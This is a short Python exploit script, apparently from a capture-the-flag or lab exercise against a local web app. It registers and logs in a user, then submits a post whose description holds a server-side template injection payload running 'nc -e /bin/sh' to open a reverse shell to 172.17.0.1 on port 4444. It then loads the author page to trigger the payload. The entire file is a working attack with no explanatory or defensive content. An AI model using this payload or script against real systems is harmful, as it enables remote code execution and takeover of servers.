import requests

port = "5105"
url = f"http://localhost:{port}"

ip = "172.17.0.1"
payload = f"<% require('child_process').exec('nc -e /bin/sh {ip} 4444') %>"
u = "user1"
p = "pass1"

s = requests.Session()

r = s.post(url + "/register", {"username": u, "password": p})

r = s.post(url + "/login", {"username": u, "password": p})

r = s.post(url + "/create", {"title": "a", "description": payload, "source": "a" , "tags": "AI"})

r = s.get(url + f"/?author={u}")

print(r.text)